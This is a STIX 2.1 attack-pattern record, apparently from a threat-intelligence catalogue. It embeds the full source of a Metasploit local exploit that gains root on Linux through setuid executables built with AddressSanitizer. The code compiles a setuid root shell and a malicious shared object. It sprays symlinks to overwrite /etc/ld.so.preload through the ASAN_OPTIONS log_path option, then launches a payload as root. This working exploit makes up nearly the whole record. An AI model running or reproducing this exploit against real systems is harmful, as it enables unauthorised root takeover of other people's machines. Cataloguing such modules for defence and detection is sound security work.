{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c2d7c75d-685e-4ae4-bf56-46c5bc6db119",
    "created": "2024-08-14T16:59:01.999729Z",
    "modified": "2024-08-14T16:59:01.999733Z",
    "name": "AddressSanitizer (ASan) SUID Executable Privilege Escalation",
    "description": " This module attempts to gain root privileges on Linux systems using setuid executables compiled with AddressSanitizer (ASan).  ASan configuration related environment variables are permitted when executing setuid executables built with libasan. The `log_path` option can be set using the `ASAN_OPTIONS` environment variable, allowing clobbering of arbitrary files, with the privileges of the setuid user.  This module uploads a shared object and sprays symlinks to overwrite `/etc/ld.so.preload` in order to create a setuid root shell.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/asan_suid_executable_priv_esc.rb",
            "external_id": "asan_suid_executable_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2016/q1/363"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2016/q1/379"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/0x27/9ff2c8fb445b6ab9c94e"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bcoles/local-exploits/tree/master/asan-suid-root"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'AddressSanitizer (ASan) SUID Executable Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges on Linux systems using\n          setuid executables compiled with AddressSanitizer (ASan).\n\n          ASan configuration related environment variables are permitted when\n          executing setuid executables built with libasan. The `log_path` option\n          can be set using the `ASAN_OPTIONS` environment variable, allowing\n          clobbering of arbitrary files, with the privileges of the setuid user.\n\n          This module uploads a shared object and sprays symlinks to overwrite\n          `/etc/ld.so.preload` in order to create a setuid root shell.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Szabolcs Nagy', # Discovery and PoC\n          'infodox',       # unsanitary.sh Exploit\n          'bcoles'         # Metasploit\n        ],\n        'DisclosureDate' => '2016-02-17',\n        'Platform' => 'linux',\n        'Arch' => [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [['Auto', {}]],\n        'DefaultOptions' => {\n          'AppendExit' => true,\n          'PrependSetresuid' => true,\n          'PrependSetresgid' => true,\n          'PrependFork' => true\n        },\n        'References' => [\n          ['URL', 'https://seclists.org/oss-sec/2016/q1/363'],\n          ['URL', 'https://seclists.org/oss-sec/2016/q1/379'],\n          ['URL', 'https://gist.github.com/0x27/9ff2c8fb445b6ab9c94e'],\n          ['URL', 'https://github.com/bcoles/local-exploits/tree/master/asan-suid-root']\n        ],\n        'Notes' => {\n          'AKA' => ['unsanitary.sh'],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n    register_options [\n      OptString.new('SUID_EXECUTABLE', [true, 'Path to a SUID executable compiled with ASan', '']),\n      OptInt.new('SPRAY_SIZE', [true, 'Number of PID symlinks to create', 50])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n\n    self.needs_cleanup = true\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def suid_exe_path\n    datastore['SUID_EXECUTABLE']\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def upload_and_compile(path, data, gcc_args = '')\n    upload \"#{path}.c\", data\n\n    gcc_cmd = \"gcc -o #{path} #{path}.c\"\n    if session.type.eql? 'shell'\n      gcc_cmd = \"PATH=$PATH:/usr/bin/ #{gcc_cmd}\"\n    end\n\n    unless gcc_args.to_s.blank?\n      gcc_cmd << \" #{gcc_args}\"\n    end\n\n    output = cmd_exec gcc_cmd\n\n    unless output.blank?\n      print_error 'Compiling failed:'\n      print_line output\n    end\n\n    register_file_for_cleanup path\n    chmod path\n  end\n\n  def check\n    return CheckCode::Safe(\"#{suid_exe_path} file not found\") unless file? suid_exe_path\n    return CheckCode::Safe(\"#{suid_exe_path} is not setuid\") unless setuid? suid_exe_path\n\n    vprint_good \"#{suid_exe_path} is setuid\"\n\n    # Check if the executable was compiled with ASan\n    #\n    # If the setuid executable is readable, and `ldd` is installed and in $PATH,\n    # we can detect ASan via linked libraries. (`objdump` could also be used).\n    #\n    # Otherwise, we can try to detect ASan via the help output with the `help=1` option.\n    # This approach works regardless of whether the setuid executable is readable,\n    # with the obvious disadvantage that it requires invoking the executable.\n\n    if readable? suid_exe_path && command_exists?('ldd')\n      unless cmd_exec(\"ldd #{suid_exe_path}\").to_s.include? 'libasan.so'\n        vprint_error \"#{suid_exe_path} was not compiled with ASan\"\n        return CheckCode::Safe\n      end\n    else\n      unless cmd_exec(\"ASAN_OPTIONS=help=1 #{suid_exe_path}\").include? 'AddressSanitizer'\n        vprint_error \"#{suid_exe_path} was not compiled with ASan\"\n        return CheckCode::Safe\n      end\n    end\n    vprint_good \"#{suid_exe_path} was compiled with ASan\"\n\n    unless has_gcc?\n      print_error 'gcc is not installed. Compiling will fail.'\n      return CheckCode::Safe\n    end\n    vprint_good 'gcc is installed'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    unless writable? pwd.to_s.strip\n      fail_with Failure::BadConfig, \"#{pwd.to_s.strip} working directory is not writable\"\n    end\n\n    if nosuid? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is mounted nosuid\"\n    end\n\n    @log_prefix = \".#{rand_text_alphanumeric 5..10}\"\n\n    payload_name = \".#{rand_text_alphanumeric 5..10}\"\n    payload_path = \"#{base_dir}/#{payload_name}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    rootshell_name = \".#{rand_text_alphanumeric 5..10}\"\n    @rootshell_path = \"#{base_dir}/#{rootshell_name}\"\n    rootshell = <<~EOF\n      #include <stdio.h>\n      #include <sys/stat.h>\n      #include <unistd.h>\n      int main(void)\n      {\n        setuid(0);\n        setgid(0);\n        execl(\"/bin/bash\", \"bash\", NULL);\n      }\n    EOF\n    upload_and_compile @rootshell_path, rootshell, '-Wall'\n\n    lib_name = \".#{rand_text_alphanumeric 5..10}\"\n    lib_path = \"#{base_dir}/#{lib_name}.so\"\n    lib = <<~EOF\n      #include <stdlib.h>\n      #include <stdio.h>\n      #include <sys/stat.h>\n      #include <unistd.h>\n      void init(void) __attribute__((constructor));\n      void __attribute__((constructor)) init() {\n        if (setuid(0) || setgid(0))\n          _exit(1);\n        unlink(\"/etc/ld.so.preload\");\n        chown(\"#{@rootshell_path}\", 0, 0);\n        chmod(\"#{@rootshell_path}\", 04755);\n        _exit(0);\n      }\n    EOF\n    upload_and_compile lib_path, lib, '-fPIC -shared -ldl -Wall'\n\n    spray_name = \".#{rand_text_alphanumeric 5..10}\"\n    spray_path = \"#{base_dir}/#{spray_name}\"\n    spray = <<~EOF\n      #include <stdio.h>\n      #include <sys/stat.h>\n      #include <unistd.h>\n      int main(void)\n      {\n        pid_t pid = getpid();\n        char buf[64];\n        for (int i=0; i<=#{datastore['SPRAY_SIZE']}; i++) {\n          snprintf(buf, sizeof(buf), \"#{@log_prefix}.%ld\", (long)pid+i);\n          symlink(\"/etc/ld.so.preload\", buf);\n        }\n      }\n    EOF\n    upload_and_compile spray_path, spray, '-Wall'\n\n    exp_name = \".#{rand_text_alphanumeric 5..10}\"\n    exp_path = \"#{base_dir}/#{exp_name}\"\n    exp = <<~EOF\n      #!/bin/sh\n      #{spray_path}\n      ASAN_OPTIONS=\"disable_coredump=1 suppressions='/#{@log_prefix}\n      #{lib_path}\n      ' log_path=./#{@log_prefix} verbosity=0\" \"#{suid_exe_path}\" >/dev/null 2>&1\n      ASAN_OPTIONS='disable_coredump=1 abort_on_error=1 verbosity=0' \"#{suid_exe_path}\" >/dev/null 2>&1\n    EOF\n    upload_and_chmodx exp_path, exp\n\n    print_status 'Launching exploit...'\n    output = cmd_exec exp_path\n    output.each_line { |line| vprint_status line.chomp }\n\n    unless setuid? @rootshell_path\n      fail_with Failure::Unknown, \"Failed to set-uid root #{@rootshell_path}\"\n    end\n    print_good \"Success! #{@rootshell_path} is set-uid root!\"\n    vprint_line cmd_exec \"ls -la #{@rootshell_path}\"\n\n    print_status 'Executing payload...'\n    cmd_exec \"echo #{payload_path} | #{@rootshell_path} & echo \"\n  end\n\n  def cleanup\n    # Safety check to ensure we don't delete everything in the working directory\n    if @log_prefix.to_s.strip.eql? ''\n      vprint_warning \"#{datastore['SPRAY_SIZE']} symlinks may require manual cleanup in: #{pwd}\"\n    else\n      cmd_exec \"rm #{pwd}/#{@log_prefix}*\"\n    end\n  ensure\n    super\n  end\n\n  def on_new_session(session)\n    # Remove rootshell executable\n    if session.type.eql? 'meterpreter'\n      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'\n      session.fs.file.rm @rootshell_path\n    else\n      session.shell_command_token \"rm -f '#{@rootshell_path}'\"\n    end\n  ensure\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-02-17",
    "x_mitre_platforms": [
        "linux'"
    ]
}